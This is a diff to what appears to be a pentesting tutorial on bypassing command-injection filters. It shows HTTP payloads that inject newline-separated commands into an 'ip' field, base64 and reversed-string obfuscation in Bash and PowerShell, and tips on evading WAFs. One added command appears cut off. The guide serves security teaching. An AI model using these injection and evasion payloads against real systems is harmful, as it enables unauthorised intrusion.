@@ -42,7 +42,7 @@ ip=127.0.0.1%0d%0aiex "$('imaohw'[-1..-20] -join '')"
 ```
 > Note: We removed the encoding on the command so that we can read it properly. But during engagements, make sure to encode the necessary characters to bypass other filters.
 ## Encoded Commands
-Another technique is encoding commands, this may be helpful for commands containing filtered characters or characters that may be URL-decoded by the server. However, this may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute.
+Another technique is encoding commands, this may be helpful for commands containing filtered characters or characters that may be URL-decoded by the server. However, this may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute (avoid this by not using encoded characters).
 
 In this case, we can utilize various tools such as `base64` for base64 encoding and `xxd` for hex encoding. For example:
 ```nix
@@ -60,6 +60,22 @@ Host: target-website.com
 
 ip=127.0.0.1%0d%0abash<<<$(base64%09-d<<<d2hvYW1pCg==)
 ```
+>   Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character. 
+
+Additionally, we can first convert the string from `utf-8` to `utf-16` before it is encoded into base64. Command is as follows:
+```nix
+echo -n whoami 
+```
+
+We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:
+```powershell
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+```
+
+
+
+
+
 
 
 > Tip: Try to create your own unique obfuscation techniques by getting creative with Bash or Powershell. This way, it is much less likely to be denied by a filter or a WAF.
